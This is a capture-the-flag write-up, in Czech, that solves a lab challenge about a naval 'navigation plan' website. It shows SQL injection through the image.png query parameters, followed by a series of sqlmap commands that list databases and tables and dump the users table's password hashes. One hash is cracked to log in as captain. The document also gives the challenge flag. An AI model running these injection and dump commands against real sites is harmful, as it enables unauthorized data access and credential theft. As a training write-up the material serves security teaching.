# Navigation plan (3)

## Zadání

Ahoy, officer,

the chief officer was invited to a naval espresso by the captain and now they are both unfit for duty. The second officer is very busy and he has asked you to find out where are we heading according to the navigation plan.

May you have fair winds and following seas!

The navigation plan webpage is available at <http://navigation-plan.cns-jv.tcc>.

## Nápovědy (Hints)

1. Use VPN to get access to the webpage.
1. Details should contain the desired information.

## Řešení

K řešení této úlohy je potřeba připojení pomocí VPN z úlohy [VPN access](../01_VPN_access/README.md)

Po otevření stránky z odkazu v zadání se zobrazí stránka se seznamem cílů, ale po kliknutí na `Detail` se zobrazí chyba o neautorizovaném přístupu. V Horní části je možné přihlášení do systému, ale neznáme jméno/heslo.

Z logu komunikace je vidět například volání na <http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1>

Když zkusíme změnit `id` na 10, server vrátí chybu

`Warning: Trying to access array offset on value of type null in /var/www/html/image.php on line 12`

Když zkusíme změnit `targets` na `targets1`, server vrátí také chybu

`Fatal error: Uncaught mysqli_sql_exception: Table 'navigation.targets1' doesn't exist in /var/www/html/image.php:9 Stack trace: #0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT data FRO...') #1 {main} thrown in /var/www/html/image.php on line 9`

Když zkusíme změnit `data` na `data1`, server vrátí také chybu

`Fatal error: Uncaught mysqli_sql_exception: Unknown column 'data1' in 'field list' in /var/www/html/image.php:9 Stack trace: #0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT data1 FR...') #1 {main} thrown in /var/www/html/image.php on line 9`

Mohlo by se tedy jednat o chybu typu SQL injection. Pro získání dat použijeme program `sqlmap`.

Test zranitelnosti\
`sqlmap --batch -o -u "http://navigation-plan.cns-jv.tcc/image.png?t=targets&type=data&id=1"`

Úspěch. Tak vyčteme databáze\
`sqlmap --batch -o -u "http://navigation-plan.cns-jv.tcc/image.png?t=targets&type=data&id=1" --dbs`

```text
available databases [2]:
[*] information_schema
[*] navigation
```

Vyčteme jména tabulek z databáze `navigation`\
`sqlmap --batch -o -u "http://navigation-plan.cns-jv.tcc/image.png?t=targets&type=data&id=1" -D navigation --tables`

```text
Database: navigation
[3 tables]
+---------+
| files   |
| targets |
| users   |
+---------+
```

Vyčteme obsah tabulky users\
`sqlmap --batch -o -u "http://navigation-plan.cns-jv.tcc/image.png?t=targets&type=data&id=1" -D navigation -T users --dump`

`[07:16:10] [WARNING] unable to retrieve column names for table 'users' in database 'navigation'`

sqlmap neumí vyčíst jména sloupců. Tak zkusíme `username` a `password`\
`# sqlmap --batch -o -u "http://navigation-plan.cns-jv.tcc/image.png?t=targets&type=data&id=1" -D navigation -T users -C username,password --dump`

```text
Database: navigation
Table: users
[3 entries]
+----------+------------------------------------------------------------------------------+
| username | password                                                                     |
+----------+------------------------------------------------------------------------------+
| engeneer | 15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225 (123456789) |
| officer  | 6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb             |
| captain  | 7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537             |
+----------+------------------------------------------------------------------------------+
```

sqlmap dekódoval heslo `123456789` pro účet `engeneer`. Přihlásit ale nejde

`This account is disabled! Enter another username.`

Na stránce <https://hashes.com/en/decrypt/hash> zkusíme dekódovat zbylá dvě hesla. Povedlo se dekódovat jen jedno

`7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537:$captainamerica$:SHA256`

Přihlášení na účet `captain / $captainamerica$` se už zdařilo. Postupným proklikáním detailů už snadno najdeme FLAG.

## Flag

`FLAG{fmIT-QkuR-FFUv-Zx44}`
